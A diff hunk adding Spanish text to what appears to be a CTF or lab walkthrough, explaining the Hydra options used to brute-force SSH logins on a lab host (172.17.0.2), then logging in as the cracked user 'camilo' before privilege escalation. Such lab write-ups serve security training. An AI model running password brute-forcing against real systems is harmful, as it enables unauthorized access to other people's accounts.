@@ -135,4 +135,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 23:23:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 23:23:54
 ```
+* Con -L seleccionamos el archivo que hemos creado.
+* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
+* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
 
+Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *camilo*.
+Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
+```ruby
+❯ ssh camilo@172.17.0.2
+camilo@172.17.0.2's password: 
+$ whoami
+camilo
+```
